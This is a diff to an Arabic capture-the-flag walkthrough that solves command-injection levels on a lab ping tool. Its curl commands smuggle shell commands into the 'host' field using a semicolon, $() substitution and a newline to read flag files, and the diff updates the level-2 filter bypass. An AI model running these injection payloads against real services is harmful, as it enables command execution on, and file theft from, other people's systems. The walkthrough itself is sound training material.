@@ -52,7 +52,7 @@ s=""; for i in $(seq 1 26); do for c in $(printf '%s ' F L A G { } _ 0 x w e b s
 ملف علم لكل مستوى؛ استخدم تقنية تجاوز المستوى:
 ```bash
 curl -G "$B/tools/ping" --data-urlencode level=1 --data-urlencode "host=127.0.0.1;cat /tmp/flag_cmdi_l1.txt"           # _l1
-curl -G "$B/tools/ping" --data-urlencode level=2 --data-urlencode 'host=127.0.0.1;echo $(cat /tmp/flag_cmdi_l2.txt)'  # _l2 ($() لأن ; مسموح لكن &|&& محذوفة)
+curl -G "$B/tools/ping" --data-urlencode level=2 --data-urlencode 'host=127.0.0.1$(cat /tmp/flag_cmdi_l2.txt)'  # _l2 (L2 يحذف ; && & | → استبدال أوامر $() أو `backticks` أو سطر جديد، بلا ;)
 curl -G "$B/tools/ping" --data-urlencode level=3 --data-urlencode $'host=127.0.0.1\ncat /tmp/flag_cmdi_l3.txt'         # _l3 (سطر جديد)
 ```
 
